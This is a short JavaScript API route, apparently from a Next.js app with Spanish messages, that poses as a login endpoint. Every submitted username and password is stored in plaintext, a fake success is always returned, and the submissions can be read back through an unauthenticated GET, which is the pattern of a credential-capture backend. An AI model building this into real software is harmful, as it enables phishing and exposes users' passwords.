import db from "../../lib/db";

export default async function handler(req, res) {
  if (req.method === "GET") {
    try {
      const rows = db.prepare("SELECT id, username, flow, status, timestamp, server_timestamp FROM submissions ORDER BY id DESC").all();
      return res.status(200).json({ status: "ok", data: rows });
    } catch (error) {
      console.error("[api/login] GET error:", error);
      return res.status(500).json({ status: "error", message: "Error al obtener envíos" });
    }
  }

  if (req.method !== "POST") {
    return res.status(405).json({ status: "error", message: "Solo POST permitido" });
  }

  const { username, password, flow = "LOGIN", timestamp } = req.body;
  if (!username || !password || !timestamp) {
    return res.status(400).json({ status: "error", message: "Faltan datos" });
  }

  try {
    const now = new Date().toISOString();
    const status = "ok";
    const message = "Inicio de sesión simulado exitoso";

    db.prepare("INSERT INTO submissions (username, password, flow, status, timestamp, server_timestamp) VALUES (?, ?, ?, ?, ?, ?)")
      .run(username, password, flow, status, timestamp, now);

    return res.status(200).json({ status, message, timestamp: now });
  } catch (error) {
    console.error("[api/login] POST error:", error);
    return res.status(500).json({ status: "error", message: "Error al registrar envío" });
  }
}
